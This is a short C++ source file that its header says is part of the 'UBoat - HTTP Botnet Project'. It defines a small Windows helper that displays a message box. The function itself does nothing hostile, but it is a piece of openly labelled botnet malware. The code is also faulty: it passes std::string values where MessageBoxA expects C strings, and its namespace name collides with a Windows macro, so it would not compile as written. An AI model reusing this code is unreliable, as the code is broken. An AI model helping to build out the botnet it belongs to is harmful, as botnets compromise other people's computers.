/**
 * This file is part of UBoat - HTTP Botnet Project
 */

#include <Windows.h>
#include <iostream>
#include <string>

namespace UBoat {
namespace MessageBox {
    void Display(std::string message, std::string title = "")
    {
#ifdef _DEBUG_
        std::cout << "[+] MessageBox(`" << message << "`, `" << title << "`)" << std::endl;
#endif
        MessageBoxA(0, message, title, 0);
    }
} // MessageBox
} // UBoat
